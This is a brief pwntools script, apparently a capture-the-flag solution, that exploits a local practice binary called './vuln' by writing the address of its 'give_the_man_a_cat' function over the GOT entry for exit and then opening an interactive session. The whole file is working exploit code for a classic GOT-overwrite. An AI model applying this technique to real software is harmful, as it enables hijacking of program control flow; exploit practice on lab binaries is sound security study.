from pwn import *

context.binary = "./vuln"
p = process()
p.sendline(b"y")
p.sendline(
    str(context.binary.functions["give_the_man_a_cat"].address).encode("ascii"))
p.sendline(str(context.binary.got["exit"]).encode("ascii"))
p.interactive()
